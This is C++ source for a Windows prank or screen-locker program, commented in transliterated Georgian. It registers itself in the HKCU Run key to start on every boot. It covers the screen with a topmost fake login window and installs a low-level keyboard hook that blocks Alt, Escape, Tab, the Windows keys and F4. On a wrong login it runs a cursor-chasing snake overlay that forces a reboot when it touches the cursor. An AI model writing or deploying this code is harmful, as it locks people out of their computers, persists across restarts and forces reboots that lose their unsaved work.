#define GLFW_EXPOSE_NATIVE_WIN32
#include <GL/glew.h>
#include <GLFW/glfw3.h>
#include <GLFW/glfw3native.h>
#include "Windows.h"
#include <vector>
#include <iostream>
#include <tchar.h>


void AddToStartup() {
    char exePath[MAX_PATH];
    // Get the current executable path
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path. Error code: " << GetLastError() << std::endl;
        return;
    }

    // Open registry key
    HKEY hKey;
    const char* keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key. Error code: " << GetLastError() << std::endl;
        return;
    }

    // Add value to registry
    const char* appName = "FullscreenLoginApp";
    if (RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1) != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry value. Error code: " << GetLastError() << std::endl;
    }
    else {
        std::cout << "Application successfully added to startup." << std::endl;
    }

    // Close registry key
    RegCloseKey(hKey);
}

//pcs azlevs shutdown privilegiebs :fire: :fire:
void EnableShutdownPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
    }
}




// snake strukturis define
struct Segment {
    float x, y;
};

// snake segmentebis raodenoba
const int snakeLength = 80;
std::vector<Segment> snake(snakeLength);
HHOOK hKeyboardHook;

//  gatishva ramodenime keys
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        // shemowmeba tu udris speciifc key ebis tu udris blokavs
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            switch (kbStruct->vkCode) {
            case VK_TAB:     // Tab key
            case VK_LSHIFT:  // Left Shift
            case VK_RSHIFT:  // Right Shift
            case VK_LWIN:    // Left Windows key
            case VK_RWIN:    // Right Windows key
            case VK_MENU:    // Alt key
            case VK_ESCAPE:  // Escape key
            case VK_F4:      // F4 key
                return 1;    // Suppress the key press
            default:
                break;       // Allow other keys
            }
        }
    }

    // yvela keys gatishva shemdeg hookze
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SetKeyboardHook() {
    // dayeneba keyboardis hookis

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (hKeyboardHook == NULL) {
        std::cerr << "Failed to set keyboard hook!" << std::endl;
    }
}

void RemoveKeyboardHook() {
    if (hKeyboardHook) {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
}


//login page sheqmna
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hwndUsername, hwndPassword;

    switch (uMsg) {
    case WM_CREATE: {
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int inputWidth = 300, inputHeight = 30, buttonWidth = 100, buttonHeight = 30;
        int centerX = (screenWidth - inputWidth) / 2;
        int centerY = (screenHeight - (inputHeight * 3 + buttonHeight + 20)) / 2;

        hwndUsername = CreateWindowEx(
            WS_EX_CLIENTEDGE, L"EDIT", NULL,
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
            centerX, centerY, inputWidth, inputHeight,
            hwnd, (HMENU)1, ((LPCREATESTRUCT)lParam)->hInstance, NULL
        );

        hwndPassword = CreateWindowEx(
            WS_EX_CLIENTEDGE, L"EDIT", NULL,
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_PASSWORD,
            centerX, centerY + inputHeight + 10, inputWidth, inputHeight,
            hwnd, (HMENU)2, ((LPCREATESTRUCT)lParam)->hInstance, NULL
        );

        CreateWindow(
            L"BUTTON", L"Login",
            WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
            centerX + (inputWidth - buttonWidth) / 2, centerY + (inputHeight * 2) + 20, buttonWidth, buttonHeight,
            hwnd, (HMENU)3, ((LPCREATESTRUCT)lParam)->hInstance, NULL
        );
    }
                  break;

    case WM_COMMAND:
        if (LOWORD(wParam) == 3) {
            // textis agheba inputebidan
            int usernameLength = GetWindowTextLength(hwndUsername);
            int passwordLength = GetWindowTextLength(hwndPassword);

            std::wstring username(usernameLength, L'\0');
            std::wstring password(passwordLength, L'\0');

            GetWindowText(hwndUsername, &username[0], usernameLength + 1);
            GetWindowText(hwndPassword, &password[0], passwordLength + 1);

            // shemowmeba tu admin an password udris inputebi
            if (username == L"admin" && password == L"password") {
                MessageBox(hwnd, L"Login successful", L"Login", MB_OK);
                //tu udris gatishva aplikaciis
                DestroyWindow(hwnd);
            }
            //tu arada snake game dawyeba
            else {
                if (!glfwInit()) {
                    return -1;
                }

                int windowWidth = 1920;
                int windowHeight = 1080;

                glfwWindowHint(GLFW_TRANSPARENT_FRAMEBUFFER, GLFW_TRUE);
                glfwWindowHint(GLFW_FLOATING, GLFW_TRUE);
                glfwWindowHint(GLFW_DECORATED, GLFW_FALSE);

                GLFWwindow* window = glfwCreateWindow(windowWidth, windowHeight, "yle", NULL, NULL);
                if (!window) {
                    glfwTerminate();
                    return -1;
                }

                glfwMakeContextCurrent(window);
                glewInit();

                HWND hwnd = glfwGetWin32Window(window);

                glClearColor(0.0f, 0.0f, 0.0f, 0.0f);

                // starting position iqneba shua wertili
                for (int i = 0; i < snakeLength; ++i) {
                    snake[i] = { windowWidth / 2.0f, windowHeight / 2.0f };
                }
                //followspeed iqneba 0.02
                float followSpeed = 0.02f;

                // dablokva klaviaturis
                SetKeyboardHook();

                while (!glfwWindowShouldClose(window)) {
                    glfwPollEvents();
                    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

                    // cursor pos gageba
                    double cursorX, cursorY;
                    glfwGetCursorPos(window, &cursorX, &cursorY);

                    snake[0].x += (static_cast<float>(cursorX) - snake[0].x) * followSpeed;
                    snake[0].y += (static_cast<float>(cursorY) - snake[0].y) * followSpeed;

                    // yvela segment mis win myofs ro miyvebodes
                    for (int i = 1; i < snakeLength; ++i) {
                        snake[i].x += (snake[i - 1].x - snake[i].x) * 0.3f;
                        snake[i].y += (snake[i - 1].y - snake[i].y) * 0.3f;
                    }

                    // 2d setup drawing dayeneba
                    glMatrixMode(GL_PROJECTION);
                    glLoadIdentity();
                    glOrtho(0, windowWidth, windowHeight, 0, -1, 1);
                    glMatrixMode(GL_MODELVIEW);
                    glLoadIdentity();
                    glDisable(GL_DEPTH_TEST);

                    glColor3f(0.0f, 1.0f, 0.0f);
                    glLineWidth(5.0f);
                    //daxatva
                    glBegin(GL_LINE_STRIP);
                    for (const auto& segment : snake) {
                        glVertex2f(segment.x, segment.y);
                        //tu distancia 10pixelze naklebia pc restartdeba
                        float distance = sqrt(pow(segment.x - cursorX, 2) + pow(segment.y - cursorY, 2));
                        if (distance < 10.0f) {
                            EnableShutdownPrivilege();
                            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
                        }
                    }
                    glEnd();



                    glfwSwapBuffers(window);
                }

                // hookisa da glfws moshoreba mara mainc araa sachiro
                RemoveKeyboardHook();
                glfwTerminate();
                return 0;
            }
        }
        break;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    AddToStartup();

    const wchar_t CLASS_NAME[] = L"FullscreenLoginWindowClass";

    // register window
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClass(&wc);

    // dayeneba keyboard hookis
    SetKeyboardHook();

    // resolution gageba da agheba
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,
        CLASS_NAME,
        L"Login Page",
        WS_POPUP | WS_VISIBLE,
        0, 0,
        screenWidth,
        screenHeight,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (hwnd == NULL) {
        RemoveKeyboardHook();
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    //message loop gashveba
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // moshoreba hookis tu app gaitisha
    RemoveKeyboardHook();

    return 0;
}